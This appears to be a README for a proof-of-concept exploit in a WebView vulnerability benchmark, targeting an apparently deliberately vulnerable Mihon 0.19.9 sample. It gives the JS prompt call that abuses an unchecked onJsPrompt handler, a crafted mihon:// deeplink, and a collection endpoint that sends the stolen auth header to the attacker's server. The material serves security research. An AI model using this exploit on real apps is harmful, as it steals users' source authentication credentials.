# 3.1.4 Insecure JavaScript Callback EXP

## 参考结构

本 EXP 复用 `exp/template` 的目录组织和通用服务：

- `server.py`：启动 HTTP/HTTPS 服务，提供 `/exp/<vid>` 攻击页面和 `/collect?d=<data>` 数据回收接口。
- `exp/<vid>.html`：漏洞触发页面。
- `received/`：回收数据落盘目录。

## 漏洞触发点

样本中的 `WebViewScreenContent.webChromeClient.onJsPrompt` 将 `mihon-reader:` 前缀的 prompt 消息作为 Native 阅读命令处理，但没有校验页面来源。攻击页面调用：

```javascript
prompt("mihon-reader:getSourceAuthHeader", "")
```

即可通过 JS prompt 回调取得 `AccountSessionStore.getSourceAuthHeader(context)` 返回的漫画源认证 header，并回传到 `/collect`。

## 使用方式

1. 启动服务：

```powershell
cd "D:\WorkSpace\PhD\zeroth grade\WebViewGPT\WebViewBench\applist\exp\mihon-0.19.9\3.1.4_Insecure_JavaScript_Callback"
python .\server.py
```

2. 记录 `server.py` 输出的本机 IP，例如 `10.201.103.217`。

3. 构造并打开 deeplink，其中 `<IP>` 替换为上一步 IP：

```text
mihon://help/webview?url=http%3A%2F%2F<IP>%3A8000%2Fexp%2F3.1.4
```

4. Mihon 通过帮助页 deeplink 打开 WebView 后加载 `http://<IP>:8000/exp/3.1.4`。页面会自动执行 prompt 命令并将结果发送到：

```text
http://<IP>:8000/collect?d=...
```

5. 回收结果会写入：

```text
.\received\collected_<timestamp>.txt
```

成功时，文件内容包含 `sourceAuthHeader=Bearer%20benchmark-source-auth-header` 一类数据。

## 说明

EXP 只用于触发当前 3.1.4 样本的 JS prompt Native 命令通道，不修改漏洞样本源码，不创建分支，不提交到 `vuln/` 或 `fix/` 分支，也不更新 `benchmark_samples.json`。
